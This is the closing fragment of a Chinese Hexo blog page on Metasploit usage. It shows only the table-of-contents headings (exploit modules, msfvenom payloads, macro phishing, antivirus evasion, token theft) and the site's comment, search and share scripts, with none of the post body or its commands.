href="#tomcat-%E6%9C%8D%E5%8A%A1"><span class="toc-text">tomcat 服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#telnet%E6%9C%8D%E5%8A%A1"><span class="toc-text">telnet服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#samba%E6%9C%8D%E5%8A%A1"><span class="toc-text">samba服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">msf漏洞利用模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-text">对内网存活的主机进行探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#smb%E6%BC%8F%E6%B4%9E"><span class="toc-text">smb漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ms12-020-RDP-%E8%93%9D%E5%B1%8F"><span class="toc-text">ms12-020 RDP 蓝屏</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-payload%E6%A8%A1%E5%9D%97"><span class="toc-text">msf payload模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#msfvenom"><span class="toc-text">msfvenom</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E5%8F%82%E6%95%B0"><span class="toc-text">所有参数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-text">常用参数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E4%BC%9A%E8%AF%9D"><span class="toc-text">监听会话</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#handler%E5%90%8E%E5%8F%B0%E6%8C%81%E7%BB%AD%E7%9B%91%E5%90%AC"><span class="toc-text">handler后台持续监听</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%8C%96"><span class="toc-text">payload 可持续化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%84%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%94%9F%E6%88%90payload"><span class="toc-text">各平台下生成payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6-%EF%BC%88%E6%9C%A8%E9%A9%AC%EF%BC%89"><span class="toc-text">payload脚本文件 （木马）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#powershell-%E9%85%8D%E5%90%88msf%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-text">powershell 配合msf无文件攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Powershell-%E9%85%8D%E5%90%88world-%E4%BC%AA%E8%A3%85%E6%9C%A8%E9%A9%AC%E6%89%A7%E8%A1%8C"><span class="toc-text">Powershell 配合world 伪装木马执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#msf%E5%AE%8F%E9%92%93%E9%B1%BC"><span class="toc-text">msf宏钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-text">免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-text">msf后渗透模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="toc-text">基本操作命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%97%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-text">盗取令牌</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'AJPST8AlszUhppXoNjsA7kyD-gzGzoHsz',
+      appKey: 'QhSl0X5FDQbqN3mjUYOiSicH',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'zh-CN'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://zerorestart.github.io/">Copyright © ZeroRestart 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://zerorestart.github.io/">Powered by ZeroRestart</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + msf%E4%BD%BF%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2F2021%2F12%2F28%2Fcrecar%25E5%25AD%25A6%25E4%25B9%25A0%25E7%25AC%2594%25E8%25AE%25B0%2F3.msf%25E4%25BD%25BF%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2021/12/28/crecar%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.msf%E4%BD%BF%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
